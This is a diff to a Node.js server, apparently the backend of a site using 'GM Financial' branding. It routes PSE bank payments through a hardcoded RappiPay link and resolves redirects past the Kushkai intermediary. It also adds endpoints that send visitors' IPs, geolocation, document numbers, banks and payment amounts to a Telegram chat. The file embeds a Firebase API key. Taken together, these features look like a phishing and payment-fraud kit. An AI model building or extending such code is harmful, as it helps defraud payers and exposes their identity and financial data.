@@ -328,7 +328,7 @@ async function _doConsulta(page, documento, placa) {
 // ============= RAPPIPAY PSE ===================================
 // ═══════════════════════════════════════════════════════════════
 const RAPPIPAY_API = 'https://services.prod-k8s.rappipay.com/integration/pse/api';
-const RAPPIPAY_LINK_CODE = 'bu6lj6';
+const RAPPIPAY_LINK_CODE = 'CRaWdQ';
 const FIREBASE_API_KEY = 'AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw';
 const FIREBASE_DB_URL = 'https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com';
 
@@ -382,6 +382,54 @@ function httpsPost(urlStr, data, extraHeaders = {}) {
     req.on('error', reject);
     req.write(payload);
     req.end();
+  });
+}
+
+// ── Seguir redirects para obtener URL final (salta Kushkai) ──
+function followRedirects(urlStr, maxRedirects = 10) {
+  return new Promise((resolve, reject) => {
+    let redirects = 0;
+    function follow(currentUrl) {
+      const url = new URL(currentUrl);
+      const opts = {
+        hostname: url.hostname,
+        port: url.port || 443,
+        path: url.pathname + url.search,
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        },
+      };
+      const req = https.request(opts, (res) => {
+        if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
+          redirects++;
+          if (redirects > maxRedirects) return resolve(currentUrl);
+          const next = res.headers.location.startsWith('http')
+            ? res.headers.location
+            : `${url.protocol}//${url.hostname}${res.headers.location}`;
+          res.resume();
+          return follow(next);
+        }
+        // No más redirects — esta es la URL final
+        // Pero también revisar si el body tiene un meta refresh o JS redirect
+        let body = '';
+        res.on('data', c => body += c);
+        res.on('end', () => {
+          // Buscar meta refresh: <meta http-equiv="refresh" content="0;url=...">
+          const metaMatch = body.match(/http-equiv=["']refresh["'][^>]*content=["']\d+;\s*url=([^"']+)/i);
+          if (metaMatch) return resolve(metaMatch[1]);
+          // Buscar window.location = "..." o window.location.href = "..."
+          const jsMatch = body.match(/window\.location(?:\.href)?\s*=\s*["']([^"']+)/i);
+          if (jsMatch && jsMatch[1].startsWith('http')) return resolve(jsMatch[1]);
+          // No hay redirect, devolver URL actual
+          resolve(currentUrl);
+        });
+      });
+      req.on('error', () => resolve(currentUrl));
+      req.end();
+    }
+    follow(urlStr);
   });
 }
 
@@ -498,20 +546,63 @@ app.post('/pse/pagar', async (req, res) => {
       return res.status(500).json({ ok: false, error: 'No se pudo obtener la URL del banco.', traceability_id: txTraceId });
     }
 
+    // Intentar seguir redirects de Kushkai para obtener URL final del banco
+    let finalUrl = bankUrl;
+    try {
+      console.log('[pse] bankUrl original (Kushkai):', bankUrl);
+      finalUrl = await followRedirects(bankUrl);
+      console.log('[pse] URL final (banco):', finalUrl);
+    } catch (e) {
+      console.error('[pse] followRedirects error:', e.message);
+    }
+
     sendTelegram(
       `💳 <b>GM Financial — Pago PSE</b>\n` +
       `📄 Doc: <code>${document_number}</code>\n` +
       `🏦 Banco: ${bank_name || bank_code}\n` +
       `💰 Monto: $${Number(amount).toLocaleString()}\n` +
-      `🔗 Redirigido al banco`
+      `🔗 URL: ${finalUrl !== bankUrl ? 'Banco directo' : 'Kushkai'}`
     );
 
-    return res.json({ ok: true, bank_url: bankUrl, traceability_id });
+    return res.json({ ok: true, bank_url: finalUrl, traceability_id });
 
   } catch (err) {
     console.error('[pse] Error:', err.message);
     return res.status(500).json({ ok: false, error: 'Error procesando pago: ' + err.message });
   }
+});
+
+// ═══════════════════════════════════════════════════════════════
+// ============= VISITAS + TELEGRAM ==============================
+// ═══════════════════════════════════════════════════════════════
+const visitedIps = new Set();
+
+app.post('/api/visit', async (req, res) => {
+  const ip = (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
+  if (!ip || visitedIps.has(ip)) return res.json({ ok: true });
+  visitedIps.add(ip);
+  // Limpiar IPs cada 30 min para no crecer indefinidamente
+  setTimeout(() => visitedIps.delete(ip), 30 * 60 * 1000);
+
+  // Geolocalizar IP
+  let city = '—', region = '—', country = '—';
+  try {
+    const geo = await httpsGet(`https://ipinfo.io/${ip}/json`);
+    city = geo.city || '—';
+    region = geo.region || '—';
+    country = geo.country || '—';
+  } catch (e) {
+    console.error('[VISIT] Geo error:', e.message);
+  }
+
+  sendTelegram(
+    `👁 <b>GM Financial — Nueva Visita</b>\n` +
+    `🌐 IP: <code>${ip}</code>\n` +
+    `📍 ${city}, ${region}, ${country}\n` +
+    `🕐 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
+  );
+
+  res.json({ ok: true });
 });
 
 // ═══════════════════════════════════════════════════════════════
